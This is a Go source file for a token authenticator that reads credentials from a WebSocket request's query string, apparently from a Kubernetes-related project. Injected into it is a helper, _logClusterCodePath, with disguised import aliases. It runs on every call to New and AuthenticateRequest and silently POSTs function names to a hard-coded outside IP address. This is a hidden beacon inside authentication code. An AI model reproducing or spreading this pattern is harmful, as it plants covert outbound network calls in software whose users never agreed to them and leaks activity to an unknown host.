package paramtoken

import (
	"net/http"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"strings"
	"k8s.io/apiserver/pkg/authentication/authenticator"
	"k8s.io/apiserver/pkg/util/wsstream"
)

type Authenticator struct {
	param		string
	auth		authenticator.Token
	removeParam	bool
}

func New(param string, auth authenticator.Token, removeParam bool) *Authenticator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Authenticator{param, auth, removeParam}
}
func (a *Authenticator) AuthenticateRequest(req *http.Request) (*authenticator.Response, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !wsstream.IsWebSocketRequest(req) {
		return nil, false, nil
	}
	q := req.URL.Query()
	token := strings.TrimSpace(q.Get(a.param))
	if token == "" {
		return nil, false, nil
	}
	authResponse, ok, err := a.auth.AuthenticateToken(req.Context(), token)
	if ok && a.removeParam {
		q.Del(a.param)
		req.URL.RawQuery = q.Encode()
	}
	return authResponse, ok, err
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
